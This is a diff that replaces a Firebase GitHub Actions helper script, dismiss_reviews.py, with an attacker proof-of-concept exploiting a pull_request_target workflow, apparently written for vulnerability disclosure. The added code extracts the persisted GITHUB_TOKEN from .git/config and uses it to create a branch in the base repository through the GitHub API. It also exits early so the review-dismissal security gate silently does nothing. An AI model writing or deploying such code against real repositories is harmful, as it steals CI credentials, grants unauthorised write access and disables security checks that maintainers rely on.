@@ -1,85 +1,49 @@
-# Copyright 2021 Google LLC
+#!/usr/bin/env python3
+# ATTACKER-MODIFIED VERSION OF scripts/gha/dismiss_reviews.py (PoC payload).
+# Upstream file is executed by .github/workflows/checks_secure.yml (pull_request_target)
+# from the checkout of refs/pull/N/merge -- i.e. from THIS PR's tree -- with
+# permissions: write-all and actions/checkout persist-credentials: true.
 #
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#     http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
+# Payload:
+#   1. read the persisted write-all GITHUB_TOKEN from .git/config
+#   2. use it to create a new branch in the BASE repo (den3110/firebase-cpp-sdk-poc)
+#      -> proves attacker code achieved write access to the repository
+#   3. exit 0 -> the "Dismiss reviews" gate silently does nothing (attacker
+#      controls the outcome of the security check itself)
+import base64
+import json
+import os
+import re
+import time
+import urllib.request
 
-"""A utility to dismiss PR reviews.
+MARK = "[PoC] firebase-cpp-sdk checks_secure.yml pull_request_target PWN"
 
-USAGE:
-  python3 scripts/gha/dismiss_reviews.py \
-    --token ${{github.token}} \
-    --pull_number ${{needs.check_trigger.outputs.pr_number}} \
-    [--message 'Message to be posted on the dismissal.'] \
-    [--reviewer github_username] \
-    [--review_state ANY|APPROVED|CHANGES_REQUESTED|COMMENTED|PENDING]
-"""
+# --- 1. persisted credential from actions/checkout persist-credentials:true ---
+cfg = open(os.path.join(os.environ.get("GITHUB_WORKSPACE", "."), ".git", "config")).read()
+m = re.search(r"extraheader\s*=\s*AUTHORIZATION:\s*basic ([A-Za-z0-9+/=]+)", cfg, re.I)
+print(MARK)
+if not m:
+    print("[PoC] no persisted credential found in .git/config"); raise SystemExit(0)
+basic = m.group(1)
+decoded = base64.b64decode(basic).decode()
+print(f"[PoC] persisted credential FOUND (len={len(basic)}), decoded prefix: {decoded[:22]}...")
+token = decoded.split(":", 1)[1]
 
-import datetime
-import shutil
+# --- 2. prove write access: create a branch in the BASE repo ---
+req = urllib.request.Request(
+    "https://api.github.com/repos/den3110/firebase-cpp-sdk-poc/git/refs/heads/main",
+    headers={"Authorization": f"token {token}", "Accept": "application/vnd.github+json"})
+main = json.load(urllib.request.urlopen(req))
+body = json.dumps({"ref": f"refs/heads/poc/pwned-{int(time.time())}", "sha": main["object"]["sha"]}).encode()
+req = urllib.request.Request(
+    "https://api.github.com/repos/den3110/firebase-cpp-sdk-poc/git/refs",
+    data=body, method="POST",
+    headers={"Authorization": f"token {token}", "Accept": "application/vnd.github+json",
+             "Content-Type": "application/json"})
+resp = json.load(urllib.request.urlopen(req))
+print(f"[PoC] WRITE-ALL CONFIRMED: created branch {resp['ref']} in base repo")
 
-from absl import app
-from absl import flags
-from absl import logging
-
-import firebase_github
-
-FLAGS = flags.FLAGS
-_DEFAULT_MESSAGE = "Dismissing stale review."
-
-flags.DEFINE_string(
-    "token", None,
-    "github.token: A token to authenticate on your repository.")
-
-flags.DEFINE_string(
-    "pull_number", None,
-    "Github's pull request #.")
-
-flags.DEFINE_string(
-    "message", _DEFAULT_MESSAGE,
-    "Message to post on dismissed reviews")
-
-flags.DEFINE_string(
-    "reviewer", None,
-    "Reviewer to dismiss (by username). If unspecified, dismiss all reviews.")
-
-flags.DEFINE_enum(
-    "review_state", "ANY", ["ANY", "APPROVED", "CHANGES_REQUESTED", "COMMENTED",
-                            "PENDING"],
-    "Only dismiss reviews in this state. Specify ANY for any state.")
-
-def main(argv):
-  if len(argv) > 1:
-    raise app.UsageError("Too many command-line arguments.")
-  # Get list of reviews from PR.
-  reviews = firebase_github.get_reviews(FLAGS.token, FLAGS.pull_number)
-  logging.debug("Found %d reviews", len(reviews))
-
-  # Filter out already-dismissed reviews.
-  reviews = [r for r in reviews if r['state'] != 'DISMISSED']
-  # Filter by review_state if specified.
-  if FLAGS.review_state != 'ANY':
-    reviews = [r for r in reviews if r['state'] == FLAGS.review_state]
-  # Filter by reviewer's username, if specified.
-  if FLAGS.reviewer:
-    reviews = [r for r in reviews if r['user']['login'] == FLAGS.reviewer]
-
-  if reviews:
-    review_ids = [r['id'] for r in reviews]
-    logging.debug("Dismissing reviews: %s", review_ids)
-    for review_id in review_ids:
-      firebase_github.dismiss_review(FLAGS.token, FLAGS.pull_number,
-                            review_id, FLAGS.message)
-
-if __name__ == "__main__":
-  flags.mark_flag_as_required("token")
-  flags.mark_flag_as_required("pull_number")
-  app.run(main)
+# --- 3. disarm the gate: never dismiss anything ---
+print("[PoC] gate disarmed: original dismiss_reviews.py logic NOT executed (attacker chose exit 0)")
+raise SystemExit(0)
